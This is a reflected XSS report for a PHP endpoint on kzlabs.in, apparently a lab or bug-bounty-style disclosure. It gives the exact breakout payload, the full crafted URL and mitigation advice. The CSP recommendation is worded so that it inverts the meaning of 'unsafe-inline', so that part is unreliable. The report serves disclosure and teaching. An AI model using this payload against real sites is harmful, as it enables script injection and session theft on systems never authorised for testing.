# Reflected XSS in Reddit-Style API Endpoint

## Summary

I identified a Reflected Cross-Site Scripting (XSS) vulnerability in the URL path parameter of the application's Reddit-style API endpoint.

The application accepts user-controlled input through the URL path and reflects it back to the page without proper sanitization or output encoding. By injecting an `<img>` tag with an `onerror` event handler directly into the URL path, arbitrary code execution is achieved when the victim visits the crafted URL.

An attacker can craft a malicious URL and trick a victim into clicking it. Once the victim visits the page, the injected JavaScript executes in the context of the vulnerable application, triggering an `alert(1)` popup.

## Vulnerability Type

**Cross-Site Scripting (XSS) - Reflected**

## Vulnerable Parameter

```text
URL Path (comment ID/thread parameter)
```

## Vulnerable URL

```text
https://kzlabs.in/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l"><img src=x onerror=alert(1)>
```

## Steps to Reproduce

1. Open the vulnerable page.

2. Replace the value in the URL path with the following payload:

   ```text
   t3_u9po1l"><img src=x onerror=alert(1)>
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
   ```

4. Observe that the browser executes the injected payload and displays an `alert(1)` popup.

## Payload Used

```text
t3_u9po1l"><img src=x onerror=alert(1)>
```

URL-encoded version:
```text
t3_u9po1l%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
```

## Proof of Concept

The application accepts the value of the URL path parameter and reflects it directly into the page HTML without proper sanitization.

The payload works by:
1. Breaking out of the existing HTML context using `">`
2. Injecting an `<img>` tag with an `onerror` event handler
3. The `onerror` event triggers when the image fails to load (due to `src=x`, where `x` is an invalid source)
4. This executes the JavaScript `alert(1)`

```html
<!-- Injected payload rendered in the page: -->
"><img src="x" onerror="alert(1)">
```

This confirms that arbitrary JavaScript execution is possible through the URL path parameter.

<img width="1241" height="460" alt="Screenshot 2026-08-14 203942" src="https://github.com/user-attachments/assets/ec656917-a556-4f94-9c6c-87995a17fa6b" />

<img width="1289" height="399" alt="Screenshot 2026-08-14 203935" src="https://github.com/user-attachments/assets/ad90608a-bc64-4ffa-8cdc-cfab4c0bdf67" />

## Impact

An attacker can craft a malicious link that, when opened by a victim, executes arbitrary JavaScript in the context of the vulnerable website. This could allow an attacker to:

- Steal session cookies and hijack user accounts
- Perform actions on behalf of the authenticated user
- Deface the webpage or manipulate its content
- Redirect users to malicious websites
- Capture keystrokes or sensitive information entered by the user

## Recommendation

To mitigate this vulnerability:

- **Output Encoding**: Use `htmlspecialchars()` (or an equivalent output-encoding function) before rendering user-controlled data in HTML to convert special characters to their HTML entities.
  ```php
  echo htmlspecialchars($commentId, ENT_QUOTES, 'UTF-8');
  ```

- **URL Path Validation**: Validate and sanitize all user inputs, including URL path parameters. Consider using a whitelist approach to allow only safe characters.
  ```php
  $commentId = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['commentId']);
  ```

- **Content Security Policy (CSP)**: Implement a strict CSP that restricts inline scripts, event handlers, and unauthorized script sources using `unsafe-inline` and `unsafe-eval` directives.

- **Context-Aware Escaping**: Use context-aware escaping based on where the data is placed (HTML body, attributes, JavaScript, etc.).

- **Web Application Firewall (WAF)**: Deploy a WAF, such as Cloudflare WAF, to help detect and block malicious XSS payloads.

- **Security Headers**: Implement security headers like `X-XSS-Protection` and `X-Content-Type-Options` for additional protection.

- **HTML Sanitization**: Use a robust HTML sanitization library (like DOMPurify or HTML Purifier) to strip dangerous tags and attributes.

- **Avoid Direct Reflection**: Consider avoiding the direct reflection of user input in the response. Use server-side validation and sanitization before output.

---
